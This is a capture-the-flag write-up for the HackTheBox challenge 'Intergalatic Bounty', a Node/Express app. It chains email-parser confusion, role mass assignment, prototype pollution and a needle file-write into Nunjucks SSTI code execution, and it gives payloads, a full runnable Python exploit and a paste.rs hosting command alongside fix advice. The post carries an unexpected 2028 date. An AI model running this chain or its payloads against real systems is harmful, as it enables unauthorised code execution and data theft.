---
layout: post
title: "Intergalatic Bounty"
date: 2028-06-03 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, nodejs, prototype-pollution, ssti, nunjucks, mass-assignment, email-parsing, needle]
description: "Four Node.js bugs chain into RCE: an email-parser disagreement leaks the verification code, a body-supplied role field grants admin, a mergedeep prototype pollution poisons needle's file-write option, and that write plants a Nunjucks SSTI payload that reads the flag."
---

## Overview

Intergalatic Bounty is a **Medium** HackTheBox **Web** challenge — a Node/Express
"Galactic Bounty Board" fronted by an admin bot, a MailHog inbox viewer, and a
verification-email flow. Four independent bugs chain from anonymous registration all the
way to remote code execution and a read of `/flag.txt`.

## The technique

The path is a four-link chain, each link enabling the next:

1. **Email-parser confusion** — registration is restricted to `@interstellar.htb`, but the
   domain is checked with `email-addresses` while the mail is delivered with `nodemailer`.
   The two libraries disagree on a quoted-local-part address, so one address passes the
   allowlist *and* delivers to a mailbox the attacker can read.
2. **Mass-assignment of `role`** — the register handler trusts a `role` field straight from
   the request body, and the Sequelize enum permits `admin`.
3. **Prototype pollution** — the admin-only bounty edit merges the untrusted body with
   `@christopy/mergedeep`, which recurses on `__proto__`.
4. **`needle` `output` gadget → SSTI RCE** — a URL-fetch endpoint calls `needle.get` with a
   bare options object; the polluted `Object.prototype.output` makes needle write the fetched
   body to a file. Point it at a Nunjucks view and the write becomes template injection.

## Solution

**Link 1 — beat the email allowlist.** `email-addresses` parses
`"test@email.htb test"@interstellar.htb` as a quoted local part with domain
`interstellar.htb` (check passes), while nodemailer delivers it to `test@email.htb` — the
exact recipient the public MailHog viewer displays. So the attacker reads their own
verification code.

**Link 2 — register as admin.** The register body carries `role`:

```json
{"email": "\"test@email.htb test\"@interstellar.htb", "password": "P@ss1234", "role": "admin"}
```

Registration does **not** send the mail — only `POST /api/sendEmail` does. Trigger it, read
the code from the inbox, `POST /api/verify`, then `POST /api/login` for an admin JWT.

**Link 3 — pollute the prototype.** `PUT /api/bounties/:id` runs
`mergedeep(record.toJSON(), req.body)`. A JSON body keeps `__proto__` as an own key (native
`JSON.parse`, unlike an object literal), so the merge walks into it:

```json
{"__proto__": {"output": "/app/views/showBounty.html"}}
```

The request returns **500** (Sequelize `update` chokes on the unknown column) — harmless, the
`Object.prototype` write already happened and is process-global.

**Link 4 — file-write to SSTI.** needle reads `options.output` by plain member access and,
on a 200 response, pipes the body to `fs.createWriteStream(config.output)`. Host the SSTI
payload on any public raw-serving URL (the container has egress):

```
{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /flag.txt')")()}}
```

`POST /api/transmit {"url":"https://paste.rs/xxxx"}` writes it into `showBounty.html`. Nunjucks
**caches compiled templates**, so overwriting the already-rendered `index.html` does nothing —
target a view not yet rendered, then `GET /bounty/1` compiles the poisoned file fresh and the
[SSTI](https://cwe.mitre.org/data/definitions/1336.html) fires (`range` is a Nunjucks global,
`range.constructor` = `Function`).

The full chain, runnable end-to-end (it re-derives the live flag; the value is redacted here):

```python
#!/usr/bin/env python3
import sys, re, time, requests

CHAL, MAIL, PASTE = sys.argv[1].rstrip('/'), sys.argv[2].rstrip('/'), sys.argv[3].rstrip('/')
EMAIL = '"test@email.htb test"@interstellar.htb'
PW = 'Sup3rSecret!123'
s = requests.Session()

# 1+2. register as admin (role mass-assignment + parser-confusion email)
s.post(f"{CHAL}/api/register", json={"email": EMAIL, "password": PW, "role": "admin"})
s.post(f"{CHAL}/api/sendEmail", json={"email": EMAIL})   # register itself does NOT send

# 3. read the verification code from the readable mailbox, verify, login
code = None
for _ in range(15):
    time.sleep(2)
    m = s.get(f"{MAIL}/", timeout=10)
    hit = re.findall(r'verification code is:\s*([0-9a-f]{32})', m.text)
    if hit: code = hit[-1]; break
s.post(f"{CHAL}/api/verify", json={"email": EMAIL, "code": code})
r = s.post(f"{CHAL}/api/login", json={"email": EMAIL, "password": PW})
s.cookies.set("auth", r.json()["token"])

# 4. prototype pollution -> needle output points at an UNcached view
bid = s.get(f"{CHAL}/api/bounties").json()[0]["id"]
s.put(f"{CHAL}/api/bounties/{bid}", json={"__proto__": {"output": "/app/views/showBounty.html"}})

# 5. transmit fetches the SSTI paste; needle writes it into the view
s.post(f"{CHAL}/api/transmit", json={"url": PASTE})

# 6. render the poisoned view -> execSync('cat /flag.txt')
time.sleep(1)
r = s.get(f"{CHAL}/bounty/{bid}", timeout=10)
print(re.search(r'HTB\{[^}]+\}', r.text).group(0))
```

Serve the SSTI body with `printf '%s' '<payload>' | curl --data-binary @- https://paste.rs`
and pass the returned URL as `PASTE`. Result:

```
HTB{...}
```

## Why it worked

Two libraries parsing the "same" email differently is a classic
[interpretation conflict](https://cwe.mitre.org/data/definitions/436.html) (CWE-436);
trusting a body `role` is [mass assignment](https://cwe.mitre.org/data/definitions/915.html)
(CWE-915); a merge helper that recurses on `__proto__` is
[prototype pollution](https://cwe.mitre.org/data/definitions/1321.html) (CWE-1321); and an
HTTP client that honors an *inherited* `output` option turns that pollution into arbitrary
file write, which the template engine turns into RCE.

## Fix / defense

- Validate the email with the same parser that sends it, or canonicalize to one address
  before both the check and delivery; reject quoted local parts.
- Never accept privilege fields (`role`) from the request body — set them server-side.
- Merge with `__proto__`/`constructor`/`prototype` guards (or `Object.create(null)` / `Map`),
  and `Object.freeze(Object.prototype)` at startup.
- Build HTTP-client option objects as `Object.assign(Object.create(null), opts)` so they can
  never inherit a polluted `output`.
